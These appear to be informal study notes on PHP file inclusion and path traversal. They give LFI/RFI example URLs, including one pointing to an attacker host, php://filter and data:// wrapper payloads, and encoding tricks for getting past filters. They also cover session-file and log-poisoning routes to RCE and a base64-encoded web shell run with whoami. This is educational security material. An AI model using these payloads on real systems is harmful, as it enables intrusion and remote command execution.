File inclusion and path traversal vulnerabilities arise when a web allows external input to change path for accessing files.

To proceed, we need to know that apps have frontend that the user(client) directly interact with and the backend, which process user request sending them to the server.

eg of frontend frameworks : React, Angular, Vue

eg. of backend used languages and frameworks: PHP, python, Javascript, Node.js, Django, Laravel.

file inclusion and path vulnerabilities arises when user inputs are not properly sanitized pr Sanitized.

traversal string "../" is used to access folder one level up.

Relative path refeers to using file and folder in the current directory: ./directory/fipt.sh

Absolute path is mentioning the complete path of the file started to the root /

Remote File Inclusion or RFI is an attacker point a parameter to a remote file that the app gets : eg. http://rfi.php?file=attacker.com/exploit.php

LFI or Local File Inclusion is the attacker exploit path traversal to access file other than what thet were intented to access: http://lfi.php?file=../../../etc/passwd

LFI can also lead to RCE if the attacker upload a malicious file and later include or execute it.

php wrappers are part of php functionalites that allows user to accrss various data stream.

php://filter allows to various transformation on data before it is read or written:: for example an attacker can convert the context of an included file like /etc/passwd 

using convert.base64-encode, the final filter would be :: php://filter/conver.base64-encode/resource=/etc/passwd

There are many categories of filters in PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip_tags), Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression Filters (zlib.deflate and zlib.inflate), and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.

For example, the table below represents the output of the target file .htaccess using the different string filters in PHP.

Payload	Output
php://filter/convert.base64-encode/resource=.htaccess
UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz
php://filter/string.rot13/resource=.htaccess
ErjevgrRatvar ba Bcgvbaf -Vaqrkrf
php://filter/string.toupper/resource=.htaccess
REWRITEENGINE ON OPTIONS -INDEXES
php://filter/string.tolower/resource=.htaccess
rewriteengine on options -indexes
php://filter/string.strip_tags/resource=.htaccess
RewriteEngine on Options -Indexes
No filter applied	RewriteEngine on Options -Indexes



The data wrapper data:// allows for data embedding, it is used to embed small amount of data directly into the appplication code

eg. : data:text/plain,<?php%20phpinfo();%20?> //// this code exceutes and dispplay the phpinfo page.

The breakdown of the payload data:text/plain,<?php phpinfo(); ?> is:

data: as the URL.
mime-type is set as text/plain.
The data part includes a PHP code snippet: <?php phpinfo(); ?>.

Talking about path traversal mitigations and their bypass.

let's say the app doesn't allows use of '../..' , we can bypass that using '..//..//' . note that double slashes are treated by system as simple.

Other bypass techniques exit...

 For instance, ../ can be encoded or obfuscated in several ways to bypass simple filters.

Standard URL Encoding: ../ becomes %2e%2e%2f
Double Encoding: Useful if the application decodes inputs twice. ../ becomes %252e%252e%252f
Obfuscation: Attackers can use payloads like ....//, which help in avoiding detection by simple string matching or filtering mechanisms. This obfuscation technique is intended to conceal directory traversal attempts, making them less apparent to basic security filters.

PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.

attacker can inject <?php echo phpinfo(); ?> in the page parameter.

This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since session IDs are hashed, the ID can be found in the cookies section of your browser.

Accessing the URL sessions.php?page=/var/lib/php/sessions/sess_[sessionID] will execute the injected PHP code in the session file. Note that you have to replace [sessionID] with the value from your PHPSESSID cookie.


Log Poisoning
Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.


Back to php wrappers :

We will use the PHP code <?php system($_GET['cmd']); echo 'Shell done!'; ?> as our payload. The value of the payload, when encoded to base64, will be php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+

PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+ is the base64-encoded version of the PHP code. When the server processes this request, it first decodes the base64 string and then executes the PHP code, allowing the attacker to run commands on the server via the "cmd" GET parameter.

Final payload to run whoami : php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami

It is important to not include the &cmd=whoami in the input field since it will be encoded when the form is submitted. Once encoded, the backend will treat it as part of the base64 code, giving you an invalid byte sequence error.
